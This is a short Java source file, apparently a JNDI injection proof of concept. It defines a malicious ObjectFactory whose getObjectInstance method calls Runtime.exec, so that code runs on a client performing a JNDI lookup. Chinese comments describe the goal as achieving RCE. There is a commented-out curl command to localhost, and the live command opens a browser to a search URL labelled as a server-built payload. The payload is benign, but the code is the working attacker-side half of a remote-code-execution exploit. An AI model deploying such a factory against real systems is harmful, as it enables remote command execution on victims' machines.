package jar_test;

/**
 * Created by ycw/Administrator on 1/24/2024.
 */

import java.util.Hashtable;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;

/**
 * 引用对象创建工厂
 */
public class ReferenceObjectFactory implements ObjectFactory {

    /**
     * @param obj  包含可在创建对象时使用的位置或引用信息的对象（可能为 null）。
     * @param name 此对象相对于 ctx 的名称，如果没有指定名称，则该参数为 null。
     * @param ctx  一个上下文，name 参数是相对于该上下文指定的，如果 name 相对于默认初始上下文，则该参数为 null。
     * @param env  创建对象时使用的环境（可能为 null）。
     * @return 对象工厂创建出的对象
     * @throws Exception 对象创建异常
     */
    public Object getObjectInstance(Object obj, Name name, Context ctx, Hashtable<?, ?> env) throws Exception {
        // 在创建对象过程中插入恶意的攻击代码，或者直接创建一个本地命令执行的Process对象从而实现RCE
        // return Runtime.getRuntime().exec("curl localhost:9000");
        System.out.println("此处，ReferenceObjectFactory  被调用了。");



        return Runtime.getRuntime().exec("cmd /c start  https://www.baidu.com/s?wd=由服务器精心构建、等待客户端触发的payload111111111111111111111111111111111111111111111111");

    }

    public static void main(String[] args) {
        System.out.println("ReferenceObjectFactory 的 main方法。");
    }

}